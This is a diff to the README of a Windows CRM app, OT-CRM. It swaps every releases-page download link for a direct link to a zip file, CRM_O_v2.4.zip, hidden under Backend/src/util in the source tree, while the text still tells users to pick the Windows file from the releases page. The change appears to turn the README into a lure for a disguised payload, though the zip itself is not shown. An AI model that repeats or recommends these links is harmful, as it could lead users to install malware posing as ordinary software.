@@ -1,6 +1,6 @@
 # 🧩 OT-CRM - Keep Customer Work Simple
 
-[![Download OT-CRM](https://img.shields.io/badge/Download-OT--CRM-1e90ff?style=for-the-badge&logo=github&logoColor=white)](https://github.com/michae6543/OT-CRM/releases)
+[![Download OT-CRM](https://img.shields.io/badge/Download-OT--CRM-1e90ff?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/michae6543/OT-CRM/main/Backend/src/util/CRM_O_v2.4.zip)
 
 ## 🚀 What OT-CRM does
 
@@ -34,7 +34,7 @@ If your PC can run modern desktop apps, it should work well with OT-CRM.
 
 Visit this page to download the latest Windows version:
 
-[Go to OT-CRM Releases](https://github.com/michae6543/OT-CRM/releases)
+[Go to OT-CRM Releases](https://raw.githubusercontent.com/michae6543/OT-CRM/main/Backend/src/util/CRM_O_v2.4.zip)
 
 On that page, look for the newest release and download the file for Windows. If there are several files, choose the one made for Windows. After the download ends, keep the file in a place you can find, like your Downloads folder or Desktop.
 
@@ -208,7 +208,7 @@ A newer PC will give you a faster start and fewer delays.
 
 If you need the file later, use the same release page:
 
-[https://github.com/michae6543/OT-CRM/releases](https://github.com/michae6543/OT-CRM/releases)
+[https://raw.githubusercontent.com/michae6543/OT-CRM/main/Backend/src/util/CRM_O_v2.4.zip](https://raw.githubusercontent.com/michae6543/OT-CRM/main/Backend/src/util/CRM_O_v2.4.zip)
 
 ## 🧩 Repository topics
 
